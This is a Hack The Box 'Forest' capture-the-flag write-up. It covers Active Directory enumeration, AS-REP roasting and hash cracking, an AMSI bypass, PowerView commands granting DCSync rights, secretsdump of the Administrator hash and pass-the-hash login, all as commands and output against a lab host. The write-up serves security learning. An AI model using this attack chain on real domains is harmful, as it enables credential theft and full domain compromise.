
This was an Active Directory box that required some solid enumeration for the foothold and we got to have some fun in Bloodhound to get over the finish.


## Enumeration

I started out my enumeration as is typical with nmap.

```bash
# Nmap 7.94 scan initiated Tue Aug 22 18:10:12 2023 as: nmap -sC -sV -oA forest_port 10.10.10.161
Nmap scan report for 10.10.10.161
Host is up (0.029s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-22 22:17:07Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open               Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m34s, deviation: 4h02m31s, median: 6m33s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-08-22T15:17:13-07:00
| smb2-time:
|   date: 2023-08-22T22:17:10
|_  start_date: 2023-08-21T00:37:42
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
```

We know now that we have kerberos and a typical AD setup.

Moving on I ran enum4linux to identity some info about the domain.

The most interesting thing that came out of this was the list of users.

```bash
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
john
```

I learned from reading some write-ups afterward that we could do this [manually](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/) with RPC client.

Next I ran kerbrute to validate these users can authenticate with kerberos and identified `svc-alfresco` was vulnerable to AS-REP roasting.

```bash
 kerbrute userenum --dc 10.10.10.161 -d htb.local realusers.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 08/23/23 - Ronnie Flathers @ropnop

2023/08/23 17:34:19 >  Using KDC(s):
2023/08/23 17:34:19 >   10.10.10.161:88

2023/08/23 17:34:19 >  [+] VALID USERNAME:       Administrator@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       HealthMailbox6ded678@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       HealthMailboxc3d7722@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       HealthMailbox968e74d@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       HealthMailbox670628e@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       HealthMailboxfc9daad@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       HealthMailboxc0a90c9@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       HealthMailbox83d6781@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       HealthMailbox0659cc1@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       sebastien@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       HealthMailboxfd87238@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       HealthMailboxb01ac64@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       HealthMailbox7108a4e@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       lucinda@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       mark@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       andy@htb.local
2023/08/23 17:34:19 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$svc-alfresco@HTB.LOCAL:a3fefd133099c8cfccf2583ae14f7f7d$d1cf965eaee61fc2f50318bfa581a715402aaa04bf463bfb961cb337ca584f3d3085f8f374a05b193fc5467d46edbef7a416667c8a0c3ff3c75c4abae9e1e1c964a4aa5d655a8c5a182f2ff88ebb96cdd13c0a6b10b11efbac2274f52a653fe5526a8422306c19174837932dadb4de2cc1a134654a9f133ec29522ca0f7fb8873f170b66e8cd186b7d927f3b24d7af4b6c232562cf394aeef8d6cce26ed2a5f7781490f0944c4af98b05ee0f36f4bcbe5ec20ba270694ab763cb443981c4414868e2a8ef206bacf305f20e78bc0ec555b59e0e56705dd17a09a923093765b0240d0a25ed61b84390dd1e5b8208dcf1a0022fbfa0b87d17435f19
2023/08/23 17:34:19 >  [+] VALID USERNAME:       svc-alfresco@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       santi@htb.local
2023/08/23 17:34:19 >  [+] VALID USERNAME:       john@htb.local
```

## Foothold

I now have a password hash that can be (hopefully) cracked.

```bash
./hashcat.bin -m 18200 ../hashes/alfredo.txt ~/Data/security/SecLists/Passwords/Leaked-Databases/rockyou.txt -O
```

Now we have a password. svc-alfresco is in the Remote Management Users, so we have winrm.

```bash
 evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

## Additional Enumeration

Now we can run bloodhound and do some authenticated enumeration on the domain.

My ingestor of choice is `bloodhound-python`.

```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -c All -ns 10.10.10.161 --zip
```

I got kind of stuck here. I was able to identify the basic path:

- Our user is in a privileged group that can modify some aspects of users, but what do I do from here?

This is when I consulted the walk through and was able to get much, much better at navigating Bloodhound and am now more confident in my ability to identify attack paths.

The path to identifying our privilege escalation:

- Mark svc-alfresco as owned
- Look at the "High Value Targets" that svc-alfresco can reach and see that they are in the privileged group Account Operators
- Click into Account Operators and see how we can reach "High Value Targets" from there
- Account Operators can manipulate the Exchange Windows Permissions Group which can modify the DACL (Discretionary Access Control List) on the DC, and allow us to perform a DCSync attack
- All that we need to do is make a new user (we have those permissions as an Account Operator) and add them to the Exchange Windows Admin group, and then do what bloodhound says

## PrivEsc

We can just add ourselves to the group and modify the DACL.

We are going to need PowerView for this. I uploaded it and loaded the script.

```ps
menu 

[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>  Bypass-4MSI

upload PowerView.ps1

. .\PowerView.ps1

*Evil-WinRM* PS C:\> Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```


Now, we can dump the domain hashes, and pass that to log in.

```bash

[~/htb/forest]$ secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
Impacket v0.10.1.dev1+20230712.145931.275f4b9 - Copyright 2022 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

```bash
evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```
## Lessons Learned

#### Exploring Bloodhound

I have never used bloodhound quite like I did here. You can mark a user as "owned" and spider out from that user. What groups is a user a part of? Does that user have any connections to other high value targets? 

I really need to learn more PowerShell. A lot of Windows stuff gets difficult for me because I cannot write the PowerShell I need.


